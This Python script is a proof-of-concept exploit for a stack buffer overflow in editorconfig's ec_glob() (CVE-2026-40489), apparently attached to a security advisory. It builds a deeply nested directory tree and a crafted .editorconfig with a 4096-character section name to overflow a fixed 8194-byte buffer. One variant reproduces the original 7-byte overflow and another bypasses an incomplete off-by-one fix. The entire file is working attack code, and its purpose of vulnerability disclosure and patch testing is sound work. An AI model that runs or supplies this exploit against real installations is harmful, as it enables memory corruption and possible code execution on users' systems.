"""Official GHSA-97xg-vrcq-254h PoC for CVE-2026-40489 (l_pattern stack overflow).

Reproduces the unbounded strcpy into l_pattern[8194] in ec_glob(). Two variants:

  * POC_A (original, ~8201 bytes): the 7-byte overflow from the advisory.
    Triggers on the *unpatched* base; rejected by both the correct fix
    (>=) and the incomplete fix (>) because pattern_len > sizeof(l_pattern).

  * POC_B (bypass, exactly 8194 bytes): triggers a 1-byte overflow via the
    off-by-one ('>' instead of '>=') in the incomplete patch. On the correct
    version (>=), this is rejected. On the unpatched base, the bare strcpy
    copies 8194 bytes plus the NUL terminator (8195 total) -> 1-byte overflow.

Both PoCs share the same shape: a deeply nested directory containing a crafted
.editorconfig with a very long section name, plus a trigger file the editorconfig
binary is asked to parse. The PoC is independent of the CVE/GHSA label and uses
only the public, observed contract of the editorconfig CLI.

Reference: GHSA-97xg-vrcq-254h.

Escape accounting (verified against src/lib/editorconfig.c:ini_handler):
    ec_special_chars = "?[]\\*-{},"   (9 chars: ? [ ] \\ * - { } ,)
    Each occurrence in the directory path adds one byte of '\' escape to the
    final pattern. Final pattern assembled in ini_handler is:
        pattern = escaped_dir + "**/" + section
    where escaped_dir = dir_length + special_count. The l_pattern buffer in
    ec_glob() is char[2 * PATTERN_MAX] = char[8194] (PATTERN_MAX = 4097).
"""
from __future__ import annotations
import argparse
import os
import shutil
import sys
from pathlib import Path


# Must match src/lib/ec_glob.c:43 verbatim.
EC_SPECIAL_CHARS = set("?[]\\*-{},")


def _count_specials(s: str) -> int:
    """Count chars in `s` that editorconfig's ini_handler will escape."""
    return sum(1 for c in s if c in EC_SPECIAL_CHARS)


def build_poc(target_root: Path, variant: str) -> tuple[Path, Path, dict]:
    """Build the PoC directory tree for `variant` (A or B) under `target_root`.

    Returns (base_dir, trigger_file, stats). The base_dir is the outermost
    directory containing the nested crafted tree. The trigger_file is the
    file that the editorconfig binary should be asked to parse.
    """
    target_root = Path(target_root).resolve()
    if target_root.exists():
        shutil.rmtree(target_root)
    target_root.mkdir(parents=True)

    # Pattern assembled in ini_handler():
    #   pattern = escaped_dir + "**/" + section
    #           = (dir_length + special_count) + 3 + section_length
    # Buffer is char l_pattern[2 * PATTERN_MAX] = 8194 bytes (PATTERN_MAX = 4097).
    section_length = 4096  # MAX_SECTION_NAME in ini.c
    if variant == "A":
        # Original PoC: 8201-byte pattern -> 7-byte overflow on the unpatched base.
        target_pattern_total = 8201
    elif variant == "B":
        # Bypass PoC for the off-by-one ('>'): 8194-byte pattern. memcpy writes
        # 8195 bytes (pattern_len + 1 for the NUL terminator) -> 1-byte overflow.
        target_pattern_total = 8194
    else:
        raise ValueError(f"unknown variant {variant!r}")
    target_escaped_dir = target_pattern_total - 3 - section_length

    base_dir = target_root / "e"
    path = str(base_dir)
    os.makedirs(path, exist_ok=True)
    current_escaped = len(path) + _count_specials(path)

    # Each "{x}" component contributes (slash + 253 chars + 2 specials) = 256
    # to the escaped_dir length. Add as many as fit.
    component = "a" * 250 + "{x}"  # 253 chars, 2 specials ('{' and '}')
    while current_escaped + 256 <= target_escaped_dir:
        path = path + "/" + component
        os.makedirs(path, exist_ok=True)
        current_escaped += 256  # 1 (slash) + 253 (chars) + 2 (specials)

    # Tail-fill: add 1 slash + body. Body contributes (chars + specials) =
    # (remaining - 1). Using only 'a' chars gives specials = 0, so body is
    # 'a' * (remaining - 1) chars, which contributes (remaining - 1) + 0 =
    # (remaining - 1) chars to escaped_dir, plus the slash = remaining total.
    remaining = target_escaped_dir - current_escaped
    if remaining > 0:
        body_len = remaining - 1  # all 'a' chars, no specials
        if body_len < 1:
            # Pathological case: remaining = 1. Add a 1-char body.
            body = "a"
            body_specials = 0
        else:
            body = "a" * body_len
            body_specials = 0
        path = path + "/" + body
        os.makedirs(path, exist_ok=True)
        current_escaped += 1 + body_len + body_specials

    # Final stats.
    actual_dir_length = len(path)
    actual_special_count = _count_specials(path)
    actual_escaped_dir = actual_dir_length + actual_special_count
    pattern_total = actual_escaped_dir + 3 + section_length
    assert pattern_total == target_pattern_total, (
        f"pattern_total {pattern_total} != target {target_pattern_total}; "
        f"dir={actual_dir_length}, specials={actual_special_count}, "
        f"escaped={actual_escaped_dir}"
    )

    # .editorconfig with the long section name.
    section = "x" * section_length
    editorconfig_path = Path(path) / ".editorconfig"
    editorconfig_path.write_text(
        f"[{section}]\nindent_style = space\nindent_size = 4\n",
        encoding="utf-8",
    )

    # Trigger file: editorconfig parses its full path against the section.
    trigger = Path(path) / "trigger.py"
    trigger.write_text("print('hello')\n", encoding="utf-8")

    stats = {
        "variant": variant,
        "dir_length": actual_dir_length,
        "special_count": actual_special_count,
        "escaped_dir_length": actual_escaped_dir,
        "section_length": section_length,
        "pattern_total": pattern_total,
        "buffer_size": 8194,
        "byte_overflow": pattern_total - 8194,
        "with_null_terminator": pattern_total + 1 - 8194,
    }
    print(f"[PoC {variant}] dir_length      = {actual_dir_length}")
    print(f"[PoC {variant}] special_count   = {actual_special_count}")
    print(f"[PoC {variant}] escaped_dir_len = {actual_escaped_dir}")
    print(f"[PoC {variant}] section_length  = {section_length}")
    print(f"[PoC {variant}] pattern_total   = {pattern_total}  "
          f"(buffer = 8194, byte_overflow = {pattern_total - 8194}, "
          f"with_null = {pattern_total + 1 - 8194})")
    return base_dir, trigger, stats


def main() -> int:
    ap = argparse.ArgumentParser(description="Build CVE-2026-40489 PoC tree")
    ap.add_argument("--root", required=True, help="output root for the PoC tree")
    ap.add_argument("--variant", choices=("A", "B"), default="A",
                    help="A=8201-byte original PoC, B=8194-byte bypass PoC")
    args = ap.parse_args()

    base_dir, trigger, _ = build_poc(args.root, args.variant)
    print(f"[PoC {args.variant}] base_dir = {base_dir}")
    print(f"[PoC {args.variant}] trigger  = {trigger}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
